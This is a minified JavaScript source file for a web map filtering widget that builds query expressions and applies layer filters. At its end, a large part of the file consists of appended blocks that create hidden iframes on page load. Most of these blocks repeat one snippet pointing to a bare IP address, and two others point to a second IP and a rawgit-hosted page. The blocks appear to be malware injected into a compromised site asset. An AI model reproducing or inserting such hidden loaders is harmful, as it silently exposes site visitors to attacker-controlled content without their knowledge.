!1;e.push(d);l.logicalOperator="OR";l.expr="";l.parts=e;this.config.webmapAppendMode?null!==g.id?f.build(c,g,l,g.id):(a=a.layer.replace(/.([^.]*)$/,"_$1"),f.build(c,g,l,a)):f.build(c,g,l);c=h(".jimu-single-filter-parameter");m.forEach(c,function(a){var b=h("table",a);m.forEach(b,function(a){x.set(a,"cellpadding","1");x.set(a,"cellspacing","1")});a=h("colgroup",a);0<a.length&&x.set(a[0].childNodes[1],"width","0px")})},formatSpacing:function(a){r.set(a,{paddingLeft:"2px",paddingRight:"2px"})},createConditionSelection:function(a,
b){e.empty(a);a=(new B({options:[{value:"OR",label:this.nls.inputs.optionOR},{value:"AND",label:this.nls.inputs.optionAND}],"class":"conjuncSelect"})).placeAt(a);a.startup();a.set("value",b.conjunc)},removeTableRow:function(a,b,c){1<c&&(c=e.create("div",{"class":"deleteCell",innerHTML:""}),this.own(k(c,"click",d.hitch(this,function(){e.destroy(b);var a=n.byId("tblPredicates");1<=a.rows.length&&e.empty(a.rows[a.rows.length-1].cells[0].firstChild.rows[2].cells[0]);this.colorRows()}))),e.place(c,a))},
removeAllRows:function(){var a=n.byId("tblPredicates");if(1<=a.rows.length){var b=z.byNode(a.rows[0].cells[0].firstChild.rows[1].cells[0].childNodes[0]);"undefined"!==typeof b&&p.byId(b.id).destroyRecursive(!0);e.destroy(a.rows[0]);this.removeAllRows()}},reconstructRows:function(a){""!==a?m.forEach(this.config.groups,d.hitch(this,function(b){if(b.name===a){var c="",g="\x3d";"undefined"!==typeof b.def?0<b.def.length?m.forEach(b.def,d.hitch(this,function(a){this.createNewRow({value:a.value,operator:a.operator,
conjunc:a.conjunc,state:"reload"})})):(c=this.checkDefaultValue(b),g=this.checkDefaultOperator(b),this.createNewRow({operator:g,value:c,conjunc:"OR",state:"new"})):(c=this.checkDefaultValue(b),g=this.checkDefaultOperator(b),this.createNewRow({operator:g,value:c,conjunc:"OR",state:"new"}))}})):this.createNewRow({operator:"\x3d",value:"",conjunc:"OR",state:"new"})},checkDefaultValue:function(a){var b="";""!==a.defaultVal&&(b=a.defaultVal);return b},checkDefaultOperator:function(a){var b="\x3d";""!==
a.operator&&(b=a.operator);return b},parseTable:function(){var a=[],b=n.byId("tblPredicates").rows;m.forEach(b,d.hitch(this,function(b,g){if(0<=g){var c=b.cells[0].firstChild;b=z.byNode(c.rows[0].cells[0].childNodes[0]);var d=z.byNode(c.rows[1].cells[0].childNodes[0]);g={};"undefined"!==typeof c.rows[2].cells[0].childNodes[0]?g=z.byNode(c.rows[2].cells[0].childNodes[0]):g.value="";var e="";if("undefined"!==typeof d.partsObj){if(d=d.getValueProviders()[0].getValueObject())e=d.value}else e=d.value;
c=h(".dijitReset.dijitInputInner",c.rows[1].cells[0].childNodes[0]);0<c.length&&""===c[0].value&&(e="");a.push({operator:b.value,userValue:e,conjunc:g.value})}}));return a},formatDate:function(a){a=new Date(a);var b=y.format(a,{datePattern:"yyyy-MM-dd",selector:"date"});a=y.format(a,{selector:"time",timePattern:"HH:mm:ss"});return b+" "+a},addDay:function(a){a=new Date(a);return new Date(a.getTime()+this.dayInMS)},subtractDay:function(a){a=new Date(a);return new Date(a.getTime()-this.dayInMS)},createQuery:function(a,
b,c,g,d,e){isNaN(g)&&(g=E.decode(g.replace(/'/g,"''")));if(""===g)return"\x3c\x3e"===c||"NOT LIKE"===c?-1<e.indexOf("Double")||-1<e.indexOf("Single")?[b,"IS NOT NULL",d].join(" ")+" ":[b,"\x3c\x3e '' OR",b,"IS NOT NULL",d].join(" ")+" ":-1<e.indexOf("Double")||-1<e.indexOf("Single")?[b,"IS NULL",d].join(" ")+" ":[b,"\x3d '' OR",b,"IS NULL",d].join(" ")+" ";if("LIKE"===c||"NOT LIKE"===c)!1===a?(g="UPPER('%"+g+"%')",b="UPPER("+b+")"):g="'%"+g+"%'";else if("START"===c)c="LIKE",!1===a?(g="UPPER('"+g+
"%')",b="UPPER("+b+")"):g+="%";else if("END"===c)c="LIKE",!1===a?(g="UPPER('%"+g+"')",b="UPPER("+b+")"):g="%"+g;else if(!1===a)if(-1<e.indexOf("Date"))if("\x3d"===c||"\x3c\x3e"===c)c="\x3d"===c?"BETWEEN":"NOT BETWEEN",g="'"+this.formatDate(g)+"' AND '"+this.formatDate(this.addDay(g))+"'";else if("\x3e"===c)g="'"+this.formatDate(this.addDay(g))+"'";else{if("d\x3c\x3d"===c||"d\x3e\x3d"===c)c=c.substr(1);"\x3c\x3d"===c&&(g=this.addDay(g));g="'"+this.formatDate(g)+"'"}else g="UPPER('"+g+"')",b="UPPER("+
b+")";return[b,c,g,d].join(" ")+" "},setFilterLayerDef:function(){this.filterExt=null;this.graphicsHolder=[];var a=this.parseTable();m.forEach(this.config.groups,d.hitch(this,function(b){if(this.grpSelect.value===b.name){var c=[];m.forEach(this.layerList,d.hitch(this,function(g){var e=[],f="",h="",k="";m.forEach(b.layers,d.hitch(this,function(l,n){"undefined"!==typeof b.appendSameLayer&&!0===b.appendSameLayer?h!==l.layer?""!==f&&(this.setupFilterToApply(g,k,f,e),f=""):""!==h&&(f=f+" "+b.appendSameLayerConjunc+
" ",f===" "+b.appendSameLayerConjunc+" "&&(f="")):f="";if(g.id===l.layer)b.def=[],k="FeatureLayer",m.forEach(a,d.hitch(this,function(a){m.forEach(g.layerObject.fields,d.hitch(this,function(d){if(d.name===l.field){if(-1<d.type.indexOf("Integer")||-1<d.type.indexOf("Double")||-1<d.type.indexOf("Single")){var g=t.sanitizeHTML(a.userValue);if(!1===isNaN(g)){if(0!==t.sanitizeHTML(a.userValue)%1){var e=g.split(".");6<e[1].length&&(e[1]=e[1].substring(0,6),g=e[0]+"."+e[1]);"\x3d"===a.operator?a.operator=
"LIKE":"\x3c\x3e"===a.operator&&(a.operator="NOT LIKE")}f+=this.createQuery(!0,l.field,a.operator,g,a.conjunc,d.type)}else console.log("Not a Number")}else-1<d.type.indexOf("Date")?""!==a.userValue?(g=new Date(t.sanitizeHTML(a.userValue)),-1<d.type.indexOf("Time")?y.format(g,{fullYear:!0,datePattern:"yyyy-MM-dd, HH:mm:ss a"}):y.format(g,{fullYear:!0,datePattern:"yyyy-MM-dd"}),f+=this.createQuery(!1,l.field,a.operator,g,a.conjunc,d.type)):f+=this.createQuery(!1,l.field,a.operator,t.sanitizeHTML(a.userValue),
a.conjunc,d.type):f+=this.createQuery(!1,l.field,a.operator,t.sanitizeHTML(a.userValue),a.conjunc,d.type);b.def.push({field:l.field,value:t.sanitizeHTML(a.userValue),operator:a.operator,conjunc:a.conjunc});c.push({field:l.field,value:t.sanitizeHTML(a.userValue),operator:a.operator,conjunc:a.conjunc})}}))}));else if(0<=l.layer.indexOf(g.id)){b.def=[];k="MapService";var p=l.layer.split(".");m.forEach(a,d.hitch(this,function(a){if(""!==a.userValue)if(-1<l.dataType.indexOf("Integer")||-1<l.dataType.indexOf("Double"))f+=
this.createQuery(!0,l.field,a.operator,t.sanitizeHTML(a.userValue),a.conjunc,l.dataType);else if(-1<l.dataType.indexOf("Date"))if(""!==a.userValue){var d=new Date(t.sanitizeHTML(a.userValue)),d=-1<l.dataType.indexOf("Time")?y.format(d,{fullYear:!0,datePattern:"yyyy-MM-dd, HH:mm:ss a"}):y.format(d,{fullYear:!0,datePattern:"yyyy-MM-dd"});f+=this.createQuery(!1,l.field,a.operator,d,a.conjunc,l.dataType)}else f+=this.createQuery(!1,l.field,a.operator,t.sanitizeHTML(a.userValue),a.conjunc,l.dataType);
else f+=this.createQuery(!1,l.field,a.operator,t.sanitizeHTML(a.userValue),a.conjunc,l.dataType);else f+=this.createQuery(!1,l.field,a.operator,t.sanitizeHTML(a.userValue),a.conjunc,l.dataType);b.def.push({field:l.field,value:t.sanitizeHTML(a.userValue),operator:a.operator,conjunc:a.conjunc});c.push({field:l.field,value:t.sanitizeHTML(a.userValue),operator:a.operator,conjunc:a.conjunc})}));""!==f&&(e[p[1]]=f.trim())}h=l.layer;"undefined"!==typeof b.appendSameLayer&&!1===b.appendSameLayer?this.setupFilterToApply(g,
k,f,e):n===b.layers.length-1&&this.setupFilterToApply(g,k,f,e)}))}));"undefined"!==typeof c&&0<c.length&&this._publishData(c)}}))},setupFilterToApply:function(a,b,c,g){"FeatureLayer"===b?""!==c&&this._applyFilter(a.layerObject,c.trim(),!1):"MapService"===b&&0<g.length&&(this.chkAppendToDef.checked?m.forEach(this.defaultDef,d.hitch(this,function(b){if(b.layer===a.id){for(slot in g)for(var d in b.definition)slot===d?g[slot]="("+b.definition[d]+") "+this.slAppendChoice.value+" "+c:""===g[slot]&&(g[slot]=
c);a.layerObject.setLayerDefinitions(g);this._zoomOnFilter(a.layerObject)}})):(a.layerObject.setLayerDefinitions(g),this._zoomOnFilter(a.layerObject)))},resetLayerDef:function(a){"undefined"===typeof a.group&&(a.group=this.grpSelect.value);m.forEach(this.config.groups,d.hitch(this,function(b){b.name===a.group&&m.forEach(b.layers,d.hitch(this,function(a){m.forEach(this.layerList,d.hitch(this,function(b){var c=!1;if(a.layer===b.id)c=!0;else for(var e=!1,f=b;!e;)0<f.newSubLayers.length?m.forEach(f.newSubLayers,
d.hitch(this,function(b){0<b.newSubLayers.length?f=b:(a.layer.replace(".","_")===b.id&&(c=!0),e=!0)})):(a.layer.replace(".","_")===f.id&&(c=!0),e=!0);c&&m.forEach(this.defaultDef,d.hitch(this,function(a){a.layer===b.id&&("undefined"!==typeof b.layerObject.defaultDefinitionExpression?this._applyFilter(b.layerObject,a.definition,!0):"undefined"!==typeof b.layerObject.layerDefinitions?b.layerObject.setLayerDefinitions(a.definition):this._applyFilter(b.layerObject,a.definition,!0),b.layerObject.setVisibility(a.visible))}))}))}))}))},
updateGroupDesc:function(a){m.forEach(this.config.groups,d.hitch(this,function(b){b.name===a&&(this.groupDesc.innerHTML=b.desc)}))},toggleSaveFilter:function(){var a;0<h(".saveTD").length?(a=h(".container"),0<a.length&&(f.replace(n.byId("saveTD"),"saveTDClose","saveTD"),a.style("display","none"),h(".saveContainer").style("display","block"),h(".groupContainer").style("display","none"),h(".buttonContainer").style("display","none"))):(a=h(".saveTDClose"),0<a.length&&(f.replace(a[0],"saveTD","saveTDClose"),
a=h(".container"),0<a.length&&(f.replace(n.byId("saveTD"),"saveTD","saveTDClose"),a.style("display","block"),h(".saveContainer").style("display","none"),h(".groupContainer").style("display","block"),h(".buttonContainer").style("display","block"))))},saveJsonToFile:function(){var a=new N({config:this.config});this.own(k(a,"complete",d.hitch(this,function(){console.log("save done")})));a.exportsJson(this.nls.files.jsonFile+".json",this.config)},readJsonToConfig:function(){h(".loadProgressHeader").style("display",
"block");h(".loadProgressShow").style("display","block");var a=new O({config:this.config,jsonFile:this.jsonFileInput.files});this.own(k(a,"complete",d.hitch(this,function(a){this.config=JSON.parse(a.UserSettings);this.resetLayerDef({group:this.grpSelect.value});this.removeAllRows();this.checkDomainUse({group:this.grpSelect.value});this.checkDateUse({group:this.grpSelect.value});this.reconstructRows(this.grpSelect.value);this.updateGroupDesc(this.grpSelect.value);setTimeout(d.hitch(this,this.setFilterLayerDef),
1E3);h(".loadProgressHeader").style("display","none");h(".loadProgressShow").style("display","none");this.jsonFileInput.value=null;this.toggleSaveFilter()})));this.own(k(a,"error",d.hitch(this,function(){this.jsonFileInput.value=null;h(".loadProgressHeader").style("display","none");h(".loadProgressShow").style("display","none")})));a.checkFileReader();return!0},_publishData:function(a){var b=[],c=[];m.forEach(a,d.hitch(this,function(a){-1===b.indexOf(a.field)&&b.push(a.field);-1===c.indexOf(a.value)&&
c.push(a.value)}));this.publishData({message:{fields:b,values:c}})},resize:function(){var a=h(".jimu-single-filter-parameter");0<a.length&&m.forEach(a,d.hitch(this,function(a){a=h("colgroup",a);0<a.length&&x.set(a[0].childNodes[1],"width","0px")}));320>=window.innerWidth?(f.add(this.btnCriteria,"hide-items"),h(".operator-class").style("display","none"),h(".container").style("borderTop","0px"),h(".value-class").style("paddingTop","-10px")):this.config.simpleMode||(f.remove(this.btnCriteria,"hide-items"),
h(".operator-class").style("display","block"),h(".container").style("borderTop","3px solid"),h(".value-class").style("paddingTop","0px"))},_applyFilter:function(a,b,c){var d=!1;"AND"===this.slAppendChoice.value&&(d=!0);L.getInstance().applyWidgetFilter(a.id,this.id,b,this.chkAppendToDef.checked,d);c||this._zoomOnFilter(a)},_zoomOnFilter:function(a){if(this.config.zoomMode)if("undefined"!==typeof a.layerDefinitions&&0<a.layerDefinitions.length)var b=k(this.map,"update-end",d.hitch(this,function(){var c=
new C;c.outFields=["*"];for(var e in a.layerDefinitions)if(a.layerDefinitions.hasOwnProperty(e)){var f=a.url+"/"+e;c.where=a.layerDefinitions[e];c.returnGeometry=!0;c.outSpatialReference=this.map.spatialReference;(new D(f)).executeForExtent(c,d.hitch(this,this._queryExtentToZoom))}b.remove()}));else{var c=new C;c.outFields=["*"];if("ArcGISImageServiceLayer"===a.type){var e=a.url;c.where=a.getDefinitionExpression();c.returnGeometry=!0;c.outSpatialReference=this.map.spatialReference;(new D(e)).executeForExtent(c,
d.hitch(this,this._queryExtentToZoom))}else a.queryExtent(c,d.hitch(this,this._queryExtentToZoom))}},_queryExtentToZoom:function(a){if("undefined"!==typeof a.extent&&null!==a.extent){var b;b=102100!==a.extent.spatialReference.wkid&&102113!==a.extent.spatialReference.wkid&&3857!==a.extent.spatialReference.wkid&&4326!==a.extent.spatialReference.wkid?A.buffer(a.extent,10,9002,!1).getExtent():A.geodesicBuffer(a.extent,10,9002,!1).getExtent();null===this.filterExt&&(this.filterExt=b);b=b.update(this.filterExt.xmin<
b.xmin?this.filterExt.xmin:b.xmin,this.filterExt.ymin<b.ymin?this.filterExt.ymin:b.ymin,this.filterExt.xmax>b.xmax?this.filterExt.xmax:b.xmax,this.filterExt.ymax>b.ymax?this.filterExt.ymax:b.ymax,b.spatialReference);this.filterExt=b=102100!==a.extent.spatialReference.wkid&&102113!==a.extent.spatialReference.wkid&&3857!==a.extent.spatialReference.wkid&&4326!==a.extent.spatialReference.wkid?A.buffer(b,200,9002,!1).getExtent():A.geodesicBuffer(b,200,9002,!1).getExtent();this.map.setExtent(b)}},onOpen:function(){console.log("onOpen")},
onClose:function(){this.chkPersistDef.checked||(this.resetLayerDef({group:this.grpSelect.value}),this.removeAllRows(),this.reconstructRows(this.grpSelect.value))},onMinimize:function(){console.log("onMinimize")},onMaximize:function(){console.log("onMaximize")},onSignIn:function(a){console.log("onSignIn")},onSignOut:function(){console.log("onSignOut")}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});